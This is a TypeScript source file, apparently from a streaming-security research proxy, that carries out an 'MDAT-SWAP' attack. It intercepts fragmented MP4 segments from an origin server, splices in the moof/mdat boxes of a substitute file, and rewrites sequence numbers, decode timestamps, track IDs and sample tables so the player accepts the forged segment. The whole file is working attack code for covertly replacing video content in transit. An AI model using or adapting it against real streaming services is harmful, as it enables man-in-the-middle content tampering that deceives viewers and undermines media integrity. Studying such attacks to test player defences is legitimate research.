import fs from 'fs';
import http from 'http';
import type { SessionState, AttackResult } from '../types.js';
import { ORIGIN, MDAT_SWAP_SOURCE_PATH } from '../config.js';
import { extractMoofMdat } from '../mp4/mdat-utils.js';
import { replaceMoofMdat } from '../mp4/mdat-utils.js';
import { proxySegment } from '../proxy/segment-proxy.js';
import {
  setMfhdSequenceNumber,
  setBaseMediaDecodeTimeInMoof,
  setTrackIdInMoof,
  setTrunSampleCount,
  rewriteTrunSampleDurations,
  rewriteTrunSampleSizes,
  getBaseMediaDecodeTimeFromMoof,
  getTrackIdFromMoof,
  getTrunSampleCount,
  getTrunSampleSizes,
  getTrunSampleDurations,
} from '../mp4/moof-utils.js';
import type { IncomingMessage, ServerResponse } from 'http';

export function applyMdatSwapAttack(session: SessionState, n: number): AttackResult | null {
  if (session.mdatAttackAt === null) {
    session.mdatAttackAt = session.lastSeenSegment !== null ? session.lastSeenSegment + 1 : n;
  }
  if (session.mdatAttackAt === n) {
    session.pendingMoofTamper = false;
    session.mdatAttackAt = null;
    session.attackConfig.enabled = false;
    session.attackConfig.type = 'none';
    return { targetSegment: n, swapMdat: true };
  }
  return null;
}

export async function proxyWithContentSwap(
  req: IncomingMessage,
  res: ServerResponse,
  targetPath: string,
  currentSegNum: number,
): Promise<void> {
  return new Promise((resolve, reject) => {
    http
      .get(`${ORIGIN}${targetPath}`, async (originRes) => {
        if (originRes.statusCode !== 200) {
          res.writeHead(originRes.statusCode ?? 502, originRes.headers);
          originRes.pipe(res);
          return resolve();
        }

        const chunks: Buffer[] = [];
        originRes.on('data', (c: Buffer) => chunks.push(c));
        originRes.on('end', async () => {
          try {
            const segmentBytes = Buffer.concat(chunks);

            let swapFileBytes: Buffer;
            try {
              swapFileBytes = fs.readFileSync(MDAT_SWAP_SOURCE_PATH);
            } catch (err) {
              console.error(`[MDAT-SWAP] Failed to read source file:`, (err as Error).message);
              await proxySegment(req, res, targetPath, currentSegNum);
              return resolve();
            }

            const swapContent = extractMoofMdat(swapFileBytes);
            if (!swapContent?.moof || !swapContent?.mdat) {
              console.error('[MDAT-SWAP] Failed to extract moof/mdat from source file');
              await proxySegment(req, res, targetPath, currentSegNum);
              return resolve();
            }

            const currentContent = extractMoofMdat(segmentBytes);
            if (!currentContent?.moof) {
              console.error('[MDAT-SWAP] Failed to extract moof from current segment');
              await proxySegment(req, res, targetPath, currentSegNum);
              return resolve();
            }

            const currentTimestamp = getBaseMediaDecodeTimeFromMoof(currentContent.moof);
            const currentTrackId = getTrackIdFromMoof(currentContent.moof);
            const injectedTrackId = getTrackIdFromMoof(swapContent.moof);

            if (
              currentTrackId !== null &&
              injectedTrackId !== null &&
              currentTrackId !== injectedTrackId
            ) {
              console.warn(`[MDAT-SWAP] Track ID mismatch, aborting attack`);
              await proxySegment(req, res, targetPath, currentSegNum);
              return resolve();
            }

            const injectedSampleCount = getTrunSampleCount(swapContent.moof);
            const injectedSampleSizes = getTrunSampleSizes(swapContent.moof);
            const injectedDurations = getTrunSampleDurations(swapContent.moof);

            let injectedMoof = Buffer.from(setMfhdSequenceNumber(swapContent.moof, currentSegNum));

            if (currentTimestamp !== null) {
              injectedMoof = Buffer.from(
                setBaseMediaDecodeTimeInMoof(injectedMoof, currentTimestamp),
              );
            }
            if (currentTrackId !== null) {
              injectedMoof = Buffer.from(setTrackIdInMoof(injectedMoof, currentTrackId));
            }
            if (injectedSampleCount !== null) {
              injectedMoof = Buffer.from(setTrunSampleCount(injectedMoof, injectedSampleCount));
            }
            if (injectedDurations && injectedDurations.length > 0) {
              injectedMoof = Buffer.from(
                rewriteTrunSampleDurations(injectedMoof, injectedDurations),
              );
            }
            if (injectedSampleSizes && injectedSampleSizes.length > 0) {
              injectedMoof = Buffer.from(rewriteTrunSampleSizes(injectedMoof, injectedSampleSizes));
            }

            const attackedBytes = Buffer.from(
              replaceMoofMdat(segmentBytes, injectedMoof, swapContent.mdat),
            );

            const verifyContent = extractMoofMdat(attackedBytes);
            if (!verifyContent?.moof || !verifyContent?.mdat) {
              console.error('[MDAT-SWAP] Attacked segment missing moof or mdat');
              await proxySegment(req, res, targetPath, currentSegNum);
              return resolve();
            }

            const headers = {
              ...originRes.headers,
              'Content-Length': attackedBytes.length.toString(),
            };
            delete headers['content-encoding'];

            res.writeHead(originRes.statusCode ?? 200, headers);
            res.end(attackedBytes);
            resolve();
          } catch (err) {
            console.error('[MDAT-SWAP] Content swap error:', (err as Error).message);
            if (!res.headersSent) {
              res.statusCode = 500;
              res.end('Internal Server Error');
            }
            reject(err);
          }
        });
      })
      .on('error', (err) => {
        console.error('Proxy error:', err.message);
        res.statusCode = 502;
        res.end('Bad Gateway');
        reject(err);
      });
  });
}
